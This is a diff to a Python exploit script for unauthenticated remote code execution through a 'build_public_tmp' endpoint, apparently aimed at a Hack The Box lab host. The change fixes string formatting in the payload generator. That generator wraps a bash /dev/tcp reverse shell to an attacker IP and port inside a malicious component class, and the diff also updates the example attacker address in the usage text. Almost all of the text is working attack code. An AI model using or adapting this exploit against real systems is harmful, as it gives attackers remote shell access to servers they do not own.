@@ -5,7 +5,6 @@ Unauthenticated RCE via build_public_tmp endpoint
 """
 
 import requests
-import json
 import sys
 import argparse
 from urllib3.exceptions import InsecureRequestWarning
@@ -13,11 +12,11 @@ from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 def create_exploit_payload(kali_ip, kali_port=9001):
-    """Create the bash /dev/tcp reverse shell payload (proven working)."""
-    # This is the exact payload from the writeup that works
-    reverse_shell_code = f'''import os
+    """Create the bash /dev/tcp reverse shell payload."""
+    # Fixed: Use .format() or concatenate to avoid f-string brace issues
+    reverse_shell_code = '''import os
 
-_x = os.system("bash -c 'bash -i >& /dev/tcp/{kali_ip}/{kali_port} 0>&1'")
+_x = os.system("bash -c 'bash -i >& /dev/tcp/''' + kali_ip + '/' + str(kali_port) + ''' 0>&1'")
 
 from lfx.custom.custom_component.component import Component
 from lfx.io import Output
@@ -27,7 +26,7 @@ class ExploitComp(Component):
     display_name="X"
     outputs=[Output(display_name="O",name="o",method="r")]
     def r(self)->Data:
-        return Data(data={{} })'''
+        return Data(data={})'''
     
     return reverse_shell_code
 
@@ -134,9 +133,7 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''
 Example usage:
-  python3 exploit.py -i 10.10.14.7 -f 7d84d636-af65-42e4-ac38-26e867052c25 -d flow.fireflow.htb -p 9001
-
-Note: The writeup uses port 9001 and bash /dev/tcp reverse shell
+  python3 exploit.py -i 10.10.15.134 -f 7d84d636-af65-42e4-ac38-26e867052c25 -d flow.fireflow.htb -p 9001
         '''
     )
     
